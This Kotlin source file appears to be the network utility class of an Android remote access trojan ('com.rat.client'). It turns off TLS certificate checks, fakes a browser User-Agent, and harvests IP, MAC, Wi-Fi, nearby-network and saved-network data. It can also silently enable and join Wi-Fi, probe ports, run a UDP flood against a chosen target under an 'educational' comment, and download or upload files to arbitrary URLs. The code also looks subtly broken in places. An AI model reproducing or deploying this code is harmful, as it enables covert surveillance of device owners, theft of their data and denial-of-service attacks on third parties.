package com.rat.client.util

import android.content.Context
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkInfo
import android.net.NetworkRequest
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.Socket
import java.net.URL
import java.util.Collections
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

class NetworkUtils private constructor() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "NetworkUtils"
        private val httpClient = createHttpClient()
        private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = emptyArray()
        })

        
        fun createHttpClient(): OkHttpClient {
            val sslContext = SSLContext.getInstance("TLS")
            sslContext.init(null, trustAllCerts, java.security.SecureRandom())

            return OkHttpClient.Builder()
                .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
                .hostnameVerifier { _, _ -> true }
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .followRedirects(true)
                .followSslRedirects(true)
                .cookieJar(okhttp3.CookieJar.NO_COOKIES)
                .build()
        }

        
        fun getHttpClient(): OkHttpClient = httpClient

        
        fun createRequest(url: String): Request.Builder {
            return Request.Builder()
                .url(url)
                .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36")
                .addHeader("Accept", "application/json, text/plain, */*")
                .addHeader("Accept-Language", "en-US,en;q=0.9")
                .addHeader("Connection", "keep-alive")
        }

        
        fun createRequestBody(json: String): okhttp3.RequestBody {
            return json.toRequestBody("application/json; charset=utf-8".toMediaType())
        }

        
        fun getNetworkInfo(context: Context): Map<String, Any> {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetwork = cm.activeNetwork
            val capabilities = activeNetwork?.let { cm.getNetworkCapabilities(it) }
            val linkProperties = activeNetwork?.let { cm.getLinkProperties(it) }

            val info = mutableMapOf<String, Any>()

            info["connected"] = activeNetwork != null
            info["network_type"] = when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "CELLULAR"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "ETHERNET"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) == true -> "BLUETOOTH"
                else -> "UNKNOWN"
            }

            if (capabilities != null) {
                info["capabilities"] = mutableMapOf<String, Boolean>(
                    "wifi" to capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI),
                    "cellular" to capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR),
                    "ethernet" to capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET),
                    "vpn" to capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN),
                    "bluetooth" to capabilities.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH),
                    "not_metered" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED),
                    "internet" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET),
                    "validated" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED),
                    "not_roaming" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_ROAMING),
                    "not_congested" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_CONGESTED),
                    "not_suspended" to capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_SUSPENDED)
                )
            }

            if (linkProperties != null) {
                info["interface_name"] = linkProperties.interfaceName
                info["link_addresses"] = linkProperties.linkAddresses.map { it.address.hostAddress }
                info["dns_servers"] = linkProperties.dnsServers.map { it.hostAddress }
                info["http_proxy"] = linkProperties.httpProxy?.let { mapOf("host" to it.host, "port" to it.port) }
                info["domains"] = linkProperties.domains
                info["mtu"] = linkProperties.mtu
            }

            // Get local IP
            info["local_ip"] = getLocalIpAddress()
            info["public_ip"] = getPublicIp()

            // WiFi info
            if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                info["wifi"] = getWifiInfo(context)
            }

            return info
        }

        
        fun getWifiInfo(context: Context): Map<String, Any> {
            val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val connectionInfo = wifiManager.connectionInfo
            val info = mutableMapOf<String, Any>()

            info["ssid"] = connectionInfo.ssid.replace("\"", "")
            info["bssid"] = connectionInfo.bssid
            info["mac_address"] = connectionInfo.macAddress
            info["ip_address" ] = intToIp(connectionInfo.ipAddress)
            info["network_id" ] = connectionInfo.networkId
            info["frequency" ] = connectionInfo.frequency
            info["link_speed" ] = connectionInfo.linkSpeed
            info["rssi" ] = connectionInfo.rssi
            info["hidden_ssid" ] = connectionInfo.hiddenSSID
            info["supplicant_state" ] = connectionInfo.supplicantState.name

            val scanResults = wifiManager.scanResults
            if (scanResults != null) {
                info["nearby_networks" ] = scanResults.take(20).map { result ->
                    mapOf(
                        "ssid" to result.SSID,
                        "bssid" to result.BSSID,
                        "level" to result.level,
                        "frequency" to result.frequency,
                        "capabilities" to result.capabilities,
                        "channel_width" to result.channelWidth
                    )
                }
            }

            val configuredNetworks = wifiManager.configuredNetworks
            if (configuredNetworks != null) {
                info["saved_networks" ] = configuredNetworks.map { config ->
                    mapOf(
                        "ssid" to config.SSID?.replace("\"", "") ?: "",
                        "bssid" to config.BSSID ?: "",
                        "network_id" to config.networkId,
                        "priority" to config.priority,
                        "hidden_ssid" to config.hiddenSSID
                    )
                }
            }

            return info
        }

        
        fun scanWifi(context: Context): Map<String, Any> {
            val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
            if (!wifiManager.isWifiEnabled) {
                wifiManager.isWifiEnabled = true
            }
            val results = wifiManager.scanResults
            val networks = results?.map { result ->
                mapOf(
                    "ssid" to result.SSID,
                    "bssid" to result.BSSID,
                    "level" to result.level,
                    "frequency" to result.frequency,
                    "capabilities" to result.capabilities,
                    "channel_width" to result.channelWidth,
                    "timestamp" to result.timestamp
                )
            } ?: emptyList()
            return mapOf("networks" to networks, "count" to networks.size)
        }

        
        fun connectWifi(context: Context, ssid: String, password: String): Map<String, Any> {
            val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val config = WifiConfiguration().apply {
                SSID = "\"$ssid\""
                if (password.isEmpty()) {
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                } else {
                    preSharedKey = "\"$password\""
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA2_PSK)
                    allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN)
                    allowedProtocols.set(WifiConfiguration.Protocol.RSN)
                    allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP)
                    allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP)
                }
            }
            val networkId = wifiManager.addNetwork(config)
            val success = networkId != -1 && wifiManager.enableNetwork(networkId, true)
            return mapOf("success" to success, "network_id" to networkId)
        }

        
        fun getLocalIpAddress(): String {
            try {
                val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
                for (iface in interfaces) {
                    val addresses = Collections.list(iface.inetAddresses)
                    for (addr in addresses) {
                        if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                            return addr.hostAddress
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error getting local IP: ${e.message}")
            }
            return "0.0.0.0"
        }

        
        fun getMacAddress(context: Context): String {
            try {
                val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
                for (iface in interfaces) {
                    if (iface.name == "wlan0" || iface.name == "eth0") {
                        val mac = iface.hardwareAddress
                        return mac?.joinToString(":") { "%02X".format(it) } ?: "00:00:00:00:00:00"
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error getting MAC: ${e.message}")
            }
            return "00:00:00:00:00:00"
        }

        
        fun getPublicIp(): String {
            try {
                val urls = listOf("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com")
                for (url in urls) {
                    val request = createRequest(url).get().build()
                    val response = httpClient.newCall(request).execute()
                    response.use {
                        if (it.isSuccessful) {
                            return it.body?.string()?.trim() ?: ""
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error getting public IP: ${e.message}")
            }
            return "Unknown"
        }

        
        fun tcpConnect(host: String, port: Int, timeout: Int = 5000): Map<String, Any> {
            return try {
                val socket = Socket()
                socket.soTimeout = timeout
                socket.connect(java.net.InetSocketAddress(host, port), timeout)
                val connected = socket.isConnected
                socket.close()
                mapOf("success" to connected, "host" to host, "port" to port)
            } catch (e: Exception) {
                mapOf("success" to false, "host" to host, "port" to port, "error" to e.message)
            }
        }

        
        fun udpFlood(target: String, port: Int, durationMs: Long): Map<String, Any> {
            // Educational: demonstrates UDP flooding capability
            // In practice, this would be used for stress testing
            val startTime = System.currentTimeMillis()
            var packetsSent = 0L
            var bytesSent = 0L

            try {
                val socket = java.net.DatagramSocket()
                socket.setBroadcast(true)
                val address = InetAddress.getByName(target)
                val packet = java.net.DatagramPacket(ByteArray(1024), 1024, address, port)

                while (System.currentTimeMillis() - startTime < durationMs) {
                    socket.send(packet)
                    packetsSent++
                    bytesSent += 1024
                    Thread.sleep(1)
                }
                socket.close()
            } catch (e: Exception) {
                return mapOf("success" to false, "error" to e.message)
            }

            return mapOf(
                "success" to true,
                "target" to target,
                "port" to port,
                "duration_ms" to durationMs,
                "packets_sent" to packetsSent,
                "bytes_sent" to bytesSent,
                "pps" to (packetsSent * 1000 / durationMs)
            )
        }

        
        fun downloadFile(url: String, destinationPath: String): Boolean {
            try {
                val request = createRequest(url).get().build()
                val response = httpClient.newCall(request).execute()
                response.use { resp ->
                    if (!resp.isSuccessful) return false
                    val body = resp.body ?: return false
                    val input = body.byteStream()
                    val output = FileOutputStream(destinationPath)
                    input.copyTo(output)
                    output.flush()
                    output.close()
                    input.close()
                    true
                }
            } catch (e: Exception) {
                Log.e(TAG, "Download failed: ${e.message}")
                false
            }
        }

        
        fun uploadFile(url: String, filePath: String, fieldName: String = "file"): Boolean {
            try {
                val file = File(filePath)
                val requestBody = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart(fieldName, file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                    .build()

                val request = createRequest(url).post(requestBody).build()
                val response = httpClient.newCall(request).execute()
                response.use { it.isSuccessful }
            } catch (e: Exception) {
                Log.e(TAG, "Upload failed: ${e.message}")
                false
            }
        }

        private fun intToIp(ip: Int): String {
            return ((ip and 0xFF).toString() + "." +
                    ((ip shr 8) and 0xFF).toString() + "." +
                    ((ip shr 16) and 0xFF).toString() + "." +
                    ((ip shr 24) and 0xFF).toString())
        }
    }
}